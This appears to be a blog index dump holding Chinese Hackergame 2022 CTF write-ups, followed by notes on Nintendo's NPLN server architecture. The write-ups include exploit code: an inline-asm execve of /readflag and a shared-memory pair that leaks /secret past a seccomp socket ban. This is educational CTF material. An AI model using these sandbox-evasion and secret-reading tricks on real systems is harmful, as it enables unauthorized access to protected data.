尝试去遍历文件夹，还把运行环境给摸透了，但是最后就是跑不起来，一度让我怀疑自己是不是方向走远了。 最后翻了翻去年自己的题解找灵感，发现好像还可以试试汇编直接 call syscall，又把 x86 syscall 表翻了出来，照着抄了下就过了…… #include \u003cstdio.h\u003e int main() { asm(\"mov $0x0b, %eax; mov $.LC0, %ebx; mov $0, %ecx; mov $0, %edx; int $0x80; \" \".LC0: .string \\\"/readflag\\\"\"); } ","date":"2022-10-28","objectID":"/post/6918ebb9/:14:2","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"蒙特卡罗轮盘赌 拉了镜像跑了下，发现后面 clock() 的数值大概在 1000 上下，写了个模拟从 0~2000 各模拟了一遍，然后跟题目交互了一下，一次过。 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003ctime.h\u003e double rand01() { return (double)rand() / RAND_MAX; } void monte_carlo(unsigned int seed, int count) { srand(seed); printf(\"%u: \", seed); for (int i = 0; i \u003c count; i++) { int M = 0; int N = 400000; for (int j = 0; j \u003c N; j++) { double x = rand01(); double y = rand01(); if (x * x + y * y \u003c 1) M++; } double pi = (double)M / N * 4; printf(\"%1.5f%c\", pi, \",\\n\"[i == count - 1]); } } int main(int argc, char **argv) { if (argc \u003c 2) { unsigned tt = time(0); for (int i = 0; i \u003c= 2000; i++) { monte_carlo(tt + i, 1); } } else if (argc \u003e= 3) { int timestamp = (int)strtol(argv[1], NULL, 10); int count = (int)strtol(argv[2], NULL, 10); monte_carlo(timestamp, count); } } ","date":"2022-10-28","objectID":"/post/6918ebb9/:15:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"惜字如金 ","date":"2022-10-28","objectID":"/post/6918ebb9/:16:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"HS384 给定了惜字如金化的 secret 和 sha384 后的结果，字典很小可以直接枚举然后爆，写个脚本几秒就算出来了。 本届最谜语人题目，我一开始直接爆了所有可见 ascii 字符，看榜上这么多人过得飞快寻思也不是都有超算啊，然后看了下补充说明，猜测是这样，然后 fuzz 了两个小时过了。 from hashlib import sha384 from hmac import digest from base64 import urlsafe_b64encode from os import getcwd, path def traverse(candidate, count, fixed=False): if len(candidate) == 1: if fixed: yield candidate * count if count \u003e 1: yield candidate * (count - 1) + 'e' return for i in range(1, count + 1): yield candidate * i if i \u003e 1: yield candidate * (i - 1) + 'e' else: sz = count - len(candidate) + 1 can, nxt = candidate[0], candidate[1:] for i in range(1, sz + 1): lhs = can * i for rhs in traverse(nxt, count - i, fixed): yield lhs + rhs def xzrj(s): return '.'.join(map(xzrj_part, s.split('.'))) def xzrj_part(s): ret = [s[0]] for i in range(1, len(s)): if s[i] in 'aeiou.0123456789': ret.append(s[i]) elif s[i] != ret[-1]: ret.append(s[i]) if len(s) \u003e 1: if ret[-1] == 'e' and ret[-2] not in 'aeiou.0123456789': ret = ret[:-1] return ''.join(ret) # ustc.edu.cn def get_key(): for first in traverse('stc', 31): for second in traverse('d', 32 - len(first)): for third in traverse('cn', 34 - len(first) - len(second), fixed=True): key = 'u' + '.'.join([first, f'e{second}u', third]) if xzrj(key) == 'ustc.edu.cn' and '62074271866' in sha384( key.encode()).hexdigest(): return key if __name__ == \"__main__\": key = get_key() print(f'key={key}, sha348(key)={sha384(key.encode()).hexdigest()}') for _ in range(3): file = input('input a path: ') with open(path.join(getcwd(), file), 'rb') as f: print('digest: ', urlsafe_b64encode(digest(key.encode(), f.read(), sha384))) ","date":"2022-10-28","objectID":"/post/6918ebb9/:16:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"置换魔群 ","date":"2022-10-28","objectID":"/post/6918ebb9/:17:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"置换群上的 RSA 给定对称群 $S_n$，随机选一个元素 $s\\in S_n$，然后给定 $n$ 和 $s^e, e=65537$，求 $s$。 首先是对称群的一些非常好用的性质： 考虑对称群上元素的两行置换写法，其实两行交换一下就是逆元，开销非常小。 元素的阶 $\\sigma(s)$，也就是 $(\\mathbb{Z}/{n}\\mathbb{Z})^\\times$ 上的 $\\phi(n)$，实际上将群写成轮换形式，就是对轮换长度求一下最小公倍数，同时还有 $s^{\\sigma(s)}=\\text{id}$。 群上的乘法其实就是对元素做交换，虽然有左右乘的关系，但是本题都是 $s$ 的倍数，所以可以直接搞。 然后其实是解一个很简单的问题。由于 $e$ 一定跟元素的阶 $\\sigma(s^e)$ 互质，而这个群的阶又至少能整除 $s$ 的阶，我们可以尝试构造式子： $$ (s^e)^p\\times s^{q\\sigma(s^e)}=s, \\text{where}\\ p, q\\in\\mathbb{Z} $$ 注意到 $s^{q\\sigma(s)}=s^{q\\sigma(s^e)}=\\text{id}$，提一下 $s$ 的幂次，我们有 $$ pe+q\\sigma(s^e)=1 $$ 然后就是一个经典问题了，直接 exgcd。注意到后面 $(s^e)^{q\\sigma(s^e)}$ 到最后其实是 $\\text{id}$，可以直接无视掉，直接求 $(s^e)^p$ 就解决问题了。如果 $p$ 是负数那就对逆元求幂。 from pwn import remote import json from sympy import gcdex from sage.all import * def task1(remote: remote): print(\"[+] Start task 1.\") remote.sendlineafter( b'Hi, welcome to permutation world. Choose one challenge to solve.\\n\u003e 1. RSA in permutation group.\\n\u003e 2. DHKE in permutation group.\\n\u003e 3. DHKE++ in permutation group.\\n\u003e other: exit()\\n\\n\u003e your choice: ', b'1', timeout=1) remote.recvuntil( b'Since the order of the permutation group can be computed easily, the RSA cryptography is not safe in this gruop.\\nAnyway, I decide to give this flag to you for free. Just get it!\\n', timeout=1) for i in range(15): line = remote.recvline().decode() n = int(line.split(',')[0][24:]) print(f\"[+] Round {i+1}: n = {n}\") remote.recvuntil(b'[+] my encrypted secret is here: \\n') secret = json.loads(remote.recvline().decode().rstrip()) print(f\"[+] Round {i+1}: secret[:10] = {secret[:10]}\") ## CORE Sn = SymmetricGroup(n) secret = Sn(secret) a = gcdex(65537, secret.order())[0] ans = bp(Sn.identity(), secret if a \u003e 0 else secret.inverse(), abs(a)) print(f\"[+] Round {i+1}: ans[:10] = {ans.domain()[:10]}\") remote.sendlineafter( b'[+] Prove that you own the secret (a list like [1,2,3]): \\n\u003e your answer: ', json.dumps(ans.domain()).encode(), timeout=1) line = remote.recvline() if line != b'Good job\\n': print(f\"[!] Round {i+1}: Failed! line = {line}\") return print(f'[+] All done!') print(f'[+] Remain bytes: {remote.recv()}') ","date":"2022-10-28","objectID":"/post/6918ebb9/:17:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"置换群上的 DH 其实我感觉要比上一问简单，由于置换群的阶是轮换的最小公倍数，这个数一定是光滑的，那么跑什么直接求离散对数的算法都会很快。拿 sage 随便构造一下，直接跑 discrete_log 就出来了。 from pwn import remote import json from sympy import gcdex from sage.all import * def task2(remote: remote): print(\"[+] Start task 2.\") remote.sendlineafter( b'Hi, welcome to permutation world. Choose one challenge to solve.\\n\u003e 1. RSA in permutation group.\\n\u003e 2. DHKE in permutation group.\\n\u003e 3. DHKE++ in permutation group.\\n\u003e other: exit()\\n\\n\u003e your choice: ', b'2', timeout=1) remote.recvuntil( b\"Since permutation group's order is super large, I believe the discrete logarithm problem is hard to solve in this group.\\nTherefore I plan to implement the DH protocol in this magic group.\\nNow, go and crack my private key!\\n\", timeout=1) for i in range(15): line = remote.recvline().decode().split(',', 1) n = int(line[0][23:]) g = json.loads(line[1][5:].rstrip()) print(f\"[+] Round {i+1}: n = {n}\") print(f\"[+] Round {i+1}: g[:10] = {g[:10]}\") y = json.loads(remote.recvline().decode()[20:].rstrip()) print(f\"[+] Round {i+1}: y[:10] = {y[:10]}\") Sn = SymmetricGroup(n) g, y = Sn(g), Sn(y) ans = discrete_log(y, g) print(f\"[+] Round {i+1}: ans = {ans}\") remote.sendlineafter( b'[+] Prove that you own the secret: \\n\u003e your answer: ', str(ans).encode(), timeout=1) line = remote.recvline() if line != b'Good job\\n': print(f\"[!] Round {i+1}: Failed! line = {line}\") return print(f'[+] All done!') print(f'[+] Remain bytes: {remote.recv()}') ","date":"2022-10-28","objectID":"/post/6918ebb9/:17:2","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"光与影 虽然我不懂 WebGL，但是本科图形学课上还是学了一点渲染，用 Chrome 的本地文件替换随便玩了下，发现把 302 行的 float t5 = t5SDF(p - vec3(36.0, 10.0, 15.0), vec3(30.0, 5.0, 5.0), 2.0); fuzz 一下那块噪音就会跑，随便搞搞就出来了。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:18:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"链上记忆大师 ","date":"2022-10-28","objectID":"/post/6918ebb9/:19:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"记忆练习 20 分钟做完，18 分钟看文档。 pragma solidity =0.8.17; contract Storage { uint256 val; function memorize(uint256 n) external { val = n; } function recall() external view returns (uint256) { return val; } } ","date":"2022-10-28","objectID":"/post/6918ebb9/:19:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"片上系统 ","date":"2022-10-28","objectID":"/post/6918ebb9/:20:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"引导扇区 下一个 PulseView，用 SPI Decoder 连对线，注意到最密密麻麻的应该是 Clock，解出来第一个 block 数据拷出来就有 flag 了。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:20:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"看不见的彼方 审计代码： add_rule(\u0026ctx, SCMP_SYS(socket)); add_rule(\u0026ctx, SCMP_SYS(accept)); add_rule(\u0026ctx, SCMP_SYS(bind)); add_rule(\u0026ctx, SCMP_SYS(connect)); add_rule(\u0026ctx, SCMP_SYS(listen)); add_rule(\u0026ctx, SCMP_SYS(recv)); add_rule(\u0026ctx, SCMP_SYS(recvfrom)); add_rule(\u0026ctx, SCMP_SYS(recvmsg)); add_rule(\u0026ctx, SCMP_SYS(send)); add_rule(\u0026ctx, SCMP_SYS(sendmsg)); add_rule(\u0026ctx, SCMP_SYS(sendto)); add_rule(\u0026ctx, SCMP_SYS(setsockopt)); add_rule(\u0026ctx, SCMP_SYS(shutdown)); add_rule(\u0026ctx, SCMP_SYS(socketcall)); add_rule(\u0026ctx, SCMP_SYS(socketpair)); add_rule(\u0026ctx, SCMP_SYS(getsockname)); add_rule(\u0026ctx, SCMP_SYS(getpeername)); add_rule(\u0026ctx, SCMP_SYS(getsockopt)); add_rule(\u0026ctx, SCMP_SYS(accept4)); add_rule(\u0026ctx, SCMP_SYS(recvmmsg)); add_rule(\u0026ctx, SCMP_SYS(sendmmsg)); add_rule(\u0026ctx, SCMP_SYS(ptrace)); 把基于 socket 做 ipc 的 api 都 ban 了，但是除了 socket Linux 还有十万种甚至九万种很多种 ipc 方法，写了个基于 shm 的解决了。 Alice: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003csys/ipc.h\u003e #include \u003csys/shm.h\u003e #include \u003csys/types.h\u003e #define KEY_ID 1919810 int main() { int shm_id = shmget(KEY_ID, 128, IPC_CREAT | 0666); FILE* reader = fopen(\"/secret\", \"r\"); char flag[2000]; fgets(flag, 2000, reader); fclose(reader); void* shm = shmat(shm_id, NULL, 0); memcpy(shm, flag, strlen(flag) + 1); shmdt(shm); return 0; } Bob: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003csys/ipc.h\u003e #include \u003csys/shm.h\u003e #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e #define KEY_ID 1919810 int main() { // sleep 5 seconds to wait read end sleep(5); for (int i = 0; i \u003c 1000; i++) { int shm_id = shmget(KEY_ID, 128, IPC_CREAT | 0666); if (shm_id == -1) { fprintf(stderr, \"get shm_id failed.\\n\"); continue; } void* shm = shmat(shm_id, NULL, 0); if (shm == (void*)-1) { fprintf(stderr, \"get shm failed.\\n\"); continue; } char flag[2000]; memcpy(flag, shm, 64); flag[64] = '\\0'; printf(\"%s\\n\", flag); return 0; } } ","date":"2022-10-28","objectID":"/post/6918ebb9/:21:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"量子藏宝图 第一幕：看懂 BB84：https://jia.je/others/2020/05/01/bb84-explained/。 第二幕：看懂题目给的提示和 https://qiskit.org/textbook/ch-algorithms/bernstein-vazirani.html，然后抄图。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:22:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"企鹅拼盘 ","date":"2022-10-28","objectID":"/post/6918ebb9/:23:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"这么简单我闭眼都可以 随便 fuzz 一下出答案。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:23:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"大力当然出奇迹啦~ 拼盘游戏每一次移动都可以看作一次 $S_{16}$ 群上的一个置换，而第二轮的移动 bit 非常少（$2^{16}$），预处理一下移动然后直接枚举移动做一下群乘法就行。 置换群实现我从上面置换魔群抄的。 from functools import reduce from permutation_group import permutation_group, permutation_element from json import loads class Board: def __init__(self): self.b = [[i * 4 + j + 1 for j in range(4)] for i in range(4)] def _blkpos(self): for i in range(4): for j in range(4): if self.b[i][j] == 16: return (i, j) def reset(self): for i in range(4): for j in range(4): self.b[i][j] = i * 4 + j + 1 def move(self, moves): for m in moves: i, j = self._blkpos() if m == 'L': self.b[i][j] = self.b[i][j - 1] self.b[i][j - 1] = 16 elif m == 'R': self.b[i][j] = self.b[i][j + 1] self.b[i][j + 1] = 16 elif m == 'U': self.b[i][j] = self.b[i - 1][j] self.b[i - 1][j] = 16 else: self.b[i][j] = self.b[i + 1][j] self.b[i + 1][j] = 16 def __bool__(self): for i in range(4): for j in range(4): if self.b[i][j] != i * 4 + j + 1: return True return False def simulate(step): b = Board() b.move(step) return permutation_element(16, reduce(lambda acc, x: acc + x, b.b, [])) def padding_bin(num, sz): s = bin(num)[2:] return '0' * (sz - len(s)) + s if __name__ == \"__main__\": S16 = permutation_group(16) with open(\"./chal/b16_obf.json\", \"r\") as f: for line in f: b16 = loads(line) break final_moves = [] for idx, moves1, moves2 in b16: final_moves.append([idx, simulate(moves1), simulate(moves2)]) for i in range(2**16): b = S16.identity() bits = padding_bin(i, 16) for bit, move1, move2 in final_moves: b = b * (move1 if bits[bit] == '1' else move2) if b != S16.identity(): print(i, bits, b) break ","date":"2022-10-28","objectID":"/post/6918ebb9/:23:2","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"火眼金睛的小 E ","date":"2022-10-28","objectID":"/post/6918ebb9/:24:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"有手就行 IDA + BinDiff。但是成功率太低了，做了大概七八次才过。 建议本题改名好运来。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:24:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["技术笔记"],"content":"NPLN 是任天堂的新一代的通用多人在线游戏网络系统，旨在替代自 3DS 时代就使用的 NEX 系统，采用全面的现代架构来进行开发，目标是在玩家无感知的情况下替换掉 NEX。NPLN 自 2018 年开始开发，全面基于 Google Cloud，并于 2021 年首先在《怪物猎人：崛起》中进行使用。 截至目前，接入 NPLN 的游戏有下面三款： 怪物猎人：崛起 宝可梦传说：阿尔宙斯 Splatoon 3 这篇文章大体上是任天堂于 2022 年 4 月，在 Google 日本主办的 Google Cloud Day: Digital ’22 活动上做的主题演讲的笔记，内容大部分来自官方 slider 的翻译和截图。这次分享也是现在网上能找到最全面的 NPLN 服务端资料（SDK 暂未全面开放给所有开发者，任天堂自己采用面也不广），故特此总结以飨读者。由于我个人日语是个二把刀，内容如果有翻译不准确的地方，还请不吝赐教。 演讲材料：视频，Slider 阅读提示 注意，这篇文章无法回答以下问题： 为什么 Splatoon 3 联机还是这么烂？ NPLN 最大的更新是在游戏的其他在线体验上，而对局的联机方案还是跟 Splatoon 2 一样的基于 P2P 的方案。也就是说，2 代存在的问题，3 代大概仍然存在。 有种说法是 NPLN 有 UDP Relay，在 NAT 打洞失败后会 Fallback 到这种模式，由于官方演讲没有提及，我在此无法下定论。（根据数据挖掘的结果，NPLN 也许使用了基于 WebRTC 的 TURN 模式） 具体 XXX 技术是怎么实现的？ 目前由于 SDK 没有开放，同时逆向分析难度较大，本文仅总结任天堂在 GCD ‘22 上公开的部分，特别细节的部分暂时不知道。 这篇文章会涉及到具体某个游戏吗？ 不会。本文只包含了 NPLN 服务端的整体架构和实现分析。对于游戏怎么接入的、SDK 怎么使用的等等都不包含在内。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:0:0","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"设计原则 NPLN 的架构是微服务化的、面向多团队的合作开发架构。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:1:0","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"为什么使用微服务？ 以微服务为导向的设计：游戏开发规模扩大的对策 需要支持的游戏服务和能力在增加 任天堂内部使用这套系统的开发者也在增加 支持多租户的设计：需要使用这套系统的作品数量增加的对策 运转、维护的负担降低 资源使用率良好 为了达成这些目标，在系统设计时选择了一些在最初系统（NEX）设计和实现时不存在或者并不被广泛采纳的技术。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:1:1","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"单体应用 vs 微服务 单体应用 服务之间的联动较为容易 发布周期（リリースサイクル，Release Cycle）会影响所有服务 很难看到各个服务各自的负载 微服务 服务之间的联动较为麻烦 各个服务的发布周期独自分离 各个服务的负载可独立观测 NPLN 的选择 基于强调各个服务开发和运营的独立性的考量，NPLN 使用微服务架构。 在实现上，任天堂采用了 Kubernetes 和 Istio 作为基础设施，并使用 Google Cloud 的 Google Kubernetes Engine（下称 GKE）和 Anthos 服务网格来构建系统。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:1:2","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"单租户或多租户 租户（マルチテナント，Tenant）：在本文中，一个游戏作品（タイトル，Title）相关的服务和基础设施统称为一个租户。 单租户 单租户即每个作品的服务实例、DB 均在单独的集群中隔离管理、维护。 优点： 易于定制 可扩展性的上限估计时仅需要考虑单个租户 易于隔离服务负载以及其他因素的影响 缺点： 随着租户数量的增加，管理难度将会上升 剩余的资源利用效率较低 译注：在演讲中，可扩展性的主要关注对象是 DB，所以下文中仅针对 DB 的可扩展性提供了解决方案。 多租户 多租户即所有 DB、游戏实例均在同一个集群中管理、维护。 优点： 即使租户数量增加，管理也会较为容易 剩余的资源使用效率较高 缺点： 定制难度高 可扩展性上限估计需要考虑多个租户 服务负载及其他因素影响可能会扩散到全体租户 NPLN 中的多租户 原则：基于多租户的设计，但是也允许部分单租户的混合配置系统。 对缺点的应对方案： 定制难度高 对于某些租户的特定逻辑，如对战匹配（マッチメイク，Matchmaking）等，使用 DSL 进行描述和抽象，使得开发者可以便捷定制开发。 可扩展性上限估计需要考虑多个租户 使用 Cloud Spanner 来作为主 DB 方案，这样在多个租户共享 DB 实例时也可以确保可扩展性。 服务负载及其他因素影响可能会扩散到全体租户 在必要的情况下通过对路由进行调整，可以针对某些租户的特定服务进行实例隔离，（译注：进而避免实例/集群等之间的影响）。 译注：这种情况其实称为混合租户（Hybrid-tenancy）更合理。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:1:3","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"架构 ","date":"2022-10-10","objectID":"/post/24e3aa77/:2:0","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"架构图与大纲图 客户端，即 Nintendo Switch 侧，使用 C++ 开发 NPLN SDK 服务端，即 NPLN 服务器侧，使用 Go 语言进行开发，并将所有基础设施建设在 Google Cloud 中 客户端和服务端使用 gRPC 协议进行交互 Nintendo Switch 主机之间使用 P2P 模式进行通信 客户端通过 Cloud Load Balancing 访问运行在 GKE 上的 NPLN 服务器 使用基于 Istio 的 Anthos 服务网格进行流量调度管理 使用基于 Agones 的 Game Servers 进行游戏服务器管理 日志等指标被发送到 BigQuery 进行分析 译注： 实际的通信方式是一种混合 P2P 模式，下文会进一步解释。 这里的 Game Servers 指的是 Google Cloud 的 Game Server 产品，并非我们传统意义上理解的独立游戏服务器（Dedicated Game Server），在下文中也会进一步解释。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:2:1","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"微服务的实现方案 由于支持混合类型的多租户以及多种游戏服务，NPLN 的每个服务都运行在单独的 Pod 里面 gRPC 的方法则将其构造成类似于 http 路径的方案，在 Istio 中基于路径进行路由 使用 VirtualService 将服务器和客户端之间的连接合二为一，而各个服务之间使用 namespace 来进行隔离。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:2:2","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"多租户配置的实现 VirtualService 同样用于实现多租户配置。下面的三张图展示了不同主机运行不同游戏情况下的流量调度去向。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:2:3","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"多集群配置的实现 在逻辑层面上，NPLN 有多个逻辑集群，如生产环境集群、测试环境集群以及管理平面集群等，目前使用多个 GKE 集群来进行分离 每个集群的配置都集中在管理平面集群上，通过管理后台（ダッシュボード，Dashboard）进行调整，并推送到各个集群的服务中 集群间的通信使用基于 mTLS 的 Istio 代理隧道进行 使用 Istio 的 VirtualService、DestinationRule、ServiceEntry、Gateway 等 CRD 组件来实现各个集群中服务间的透明访问 由于设计实现时 Anthos 的多集群功能在 beta 阶段，未来会考虑稳定后迁移到 Anthos 的多集群管理功能 ","date":"2022-10-10","objectID":"/post/24e3aa77/:2:4","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"使用 Google Cloud 时遇到的问题与解决方案 ","date":"2022-10-10","objectID":"/post/24e3aa77/:3:0","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"对战匹配系统流程 Nintendo Switch 客户端提出对战匹配请求 NPLN 服务器从 Cloud Spanner 中查找或者创建游戏 Session Agones 创建 Gamesync 实例 Gamesync 将状态报告给 NPLN 服务器 NPLN 服务器将 Gamesync 的信息返回给客户端 客户端各自连接 Gamesync 客户端之间开始 P2P 通信 Gamesync 是用于保存 Session 相关游戏状态的服务，一个 Session 对应一个 Gamesync 实例。举例来说，假定某一时刻有 100 万玩家在线，而这个游戏的在线模式每个 Session 有四位玩家，则我们可以估计这个时刻约有 25 万个不同的 Gamesync 实例。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:3:1","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"Agones 与 Gamesync Agones 用于管理游戏服务器的开源软件（OSS，Open Source Software） 游戏服务器群被称作 Fleet 进行管理，而每个游戏服务器使用 Pod 进行运行管理，在 NPLN 中即 Gamesync Controller 负责管理整个系统，Allocator 负责创建 GameServer 实例 游戏服务器状态管理 Allocated：正在使用中 Ready：可以使用 FleetAutoscaler 可以对 Buffer 进行管理 监控并自动扩容，以满足服务稳定要求的最少 Ready 状态 Pod 数等 Gamesync Gamesync 是游戏 Session 管理服务器，用来对每个 Session 进行相关的状态管理 功能 强一致内存数据库，支持多个客户端对复杂数据结构的随机读写 游戏状态变更时进行实时通知 使用方式举例 管理在 P2P 中容易出现不一致的状态 P2P 连接中的 Signaling 流程的处理 译注：根据数据挖掘的结果，任天堂在 NPLN SDK 中包含了 WebRTC 库，猜测在 NPLN 中使用了 WebRTC 来实现 P2P，而 Signaling 是 WebRTC 中一个专用服务器，起到了常规 NAT 穿越过程中 STUN/TURN 服务发现的功能。 所以，第二个使用方式中，可能的意思是 Gamesync 也会负责客户端之间 P2P NAT 穿越的工作。 ","date":"2022-10-10","objectID":"/post/24e3aa77/:3:2","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"Allocate 吞吐量过低的问题与解决 Allocate 的职责 Gamesync 发生状态变更时进行处理 将 Pod 的状态从 Ready 迁移到 Allocated Allocate 操作的吞吐量低于预期 创建了单独的 Forked Agones 来 Debug 猜测是 GKE 控制平面带来的延迟 Cloud Trace 中没观察到显著延迟 专注于不可观测的控制平面部分 通过重复创建和删除轻量级 Pod 来进行实验，并最终确认性能没有到达预期，换句话说这就是问题所在 通过将预留 node 数量增加到 500 获得性能提升 Pod 的操作 QPS 从 20 增加到 100 Allocate 的吞吐量也确认得到提升 通过 Pod 重用进一步获得性能提升 默认在每个 Pod 使用完毕后直接删除 将删除操作修改为从 Allocated 状态迁移到 Ready 译注：在 GKE 文档中，明确提到了第一个解决方案相关的限制： ","date":"2022-10-10","objectID":"/post/24e3aa77/:3:3","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"多集群化 单集群的性能上限 Gamesync 分配速度受 GKE 控制平面性能限制 多集群提升可扩展性 由 NPLN 服务来分发请求到具体集群上 可基于集群数量来进行扩展 作为权衡，运营成本可能会增加 ","date":"2022-10-10","objectID":"/post/24e3aa77/:3:4","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"共享 Gamesync Google Cloud 的限制 每个区域的最大集群数量 大量的集群操作导致运营成本增加 资源消费效率低 解决方案：在一个 Gamesync 中共享多个 Session 从逻辑上分离 Gamesync 效果 集群操作量显著减少 改善资源使用效率 ","date":"2022-10-10","objectID":"/post/24e3aa77/:3:5","tags":["NPLN","任天堂","学习笔记","技术翻译"],"title":"任天堂 NPLN 服务架构演讲学习笔记","uri":"/post/24e3aa77/"},{"categories":["技术笔记"],"content":"Game Servers 用例 用于管理多个 Agones 集群的 Google Cloud 托管服务 NPLN 的用例 对多集群化的 Agones 进行资源管理 对 Fleet 进行金丝雀发布 对集群进行蓝绿发布 一种用例 在可以在 Game Servers 中创建不同的配置，并在发布时针对不同的大区（Realm）使用不同的配置。 多集群下 Agones 的资源管理 不使用 Game Servers 的情况下 Operator 必须手动操作不同集群的 Agones 实例 使用 Game Servers 的情况下 Game Servers 可以同步操作不同集群下的 Agones 实例，仅操作特定集群也是可以的 对 Fleet 进行金丝雀（Canary）发布 通过划分 Deployment 进行金丝雀发布 在确认正常工作后进行全量 Deployment 这样即使新版本不符合预期也不会影响整体服务 出现问题时，非线上版本的 Pod 只有极小部分 如果出现问题，则逐个回滚 对集群进行蓝绿（Blue/Green）发布 在 GKE 和 Agones 更新时使用 出现问题则立即回滚 Game Servers 增加新集群，删除旧集群 NPLN 服务 增加新集群的端点 删除旧集群的端点 旧集群清理 当 Allocated 状态的 Gamesync 到达 